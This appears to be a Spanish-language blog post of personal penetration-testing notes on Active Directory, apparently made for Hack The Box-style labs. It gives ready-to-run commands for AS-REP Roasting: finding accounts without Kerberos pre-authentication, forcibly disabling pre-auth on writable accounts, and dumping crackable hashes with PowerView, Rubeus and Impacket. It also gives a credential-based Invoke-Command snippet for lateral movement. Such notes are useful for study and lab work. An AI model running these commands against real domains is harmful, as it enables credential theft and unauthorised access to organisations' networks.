---
title: Active Directory
description: "Apuntes de Active Directory"
last_modified_at: false
date: 2026-01-11 06:22:59 -500
categories: [Active Directory]
tags: [Cyberseguridad, Windows]
home_image: banner
banner:
  path: /assets/posts/active-directory.png
  alt: "Active Directory"
---

## ASREPRast

Si una cuenta de usuario de dominio no requiere autenticación previa de Kerberos, podemos solicitar un TGT válido para esta cuenta sin siquiera tener credenciales de dominio, extraer el
blob cifrado y ejecutarlo por fuerza bruta sin conexión.

- PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
- AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

Desactivar forzosamente la preautorización de Kerberos en una cuenta con permisos de escritura o superiores. Consultar permisos interesantes en las cuentas:

Sugerencia: agregamos un filtro, por ejemplo, RDPUsers, para obtener "Cuentas de usuario", no Cuentas de máquina, ¡porque los hashes de Cuentas de máquina no se pueden descifrar!

- PowerView:

```shell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
Disable Kerberos Preauth:
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
```
Y finalmente ejecutar el ataque utilizando la herramienta ASREPRoast.

```shell
#Get a specific Accounts hash:
Get-ASREPHash -UserName <UserName> -Verbose

#Get any ASREPRoastable Users hashes:
Invoke-ASREPRoast -Verbose
```

- Usando Rubeus:

```shell
#Trying the attack for all domain users
Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

#ASREPRoast specific user
Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

#ASREPRoast users of a specific OU (Organization Unit)
Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
```


- Usando Impacket:

```shell
#Trying the attack for the specified users on the file
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
```

## Movimiento lateral

### Remote Code Execution with PS Credentials

```shell
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```


